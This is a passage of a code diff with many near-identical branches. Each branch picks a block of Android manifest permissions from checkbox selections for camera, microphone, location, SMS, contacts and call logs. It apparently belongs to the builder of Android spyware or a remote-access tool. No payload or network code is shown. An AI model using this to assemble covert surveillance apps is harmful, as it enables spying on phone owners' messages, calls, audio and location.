+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
+        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.CAMERA"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-feature android:name="android.hardware.camera"/>
+            <uses-feature android:name="android.hardware.camera.autofocus"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
+
+          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
+            var permArray = `
+            <uses-permission android:name="android.permission.WAKE_LOCK"/>
+            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
+            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
+            <uses-permission android:name="android.permission.INTERNET"/>
+            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+            <uses-permission android:name="android.permission.READ_SMS"/>
+            <uses-permission android:name="android.permission.SEND_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+            <uses-permission android:name="android.permission.WRITE_SMS"/>
+            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+            <uses-permission android:name="android.permission.READ_CONTACTS"/>
+            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `        }
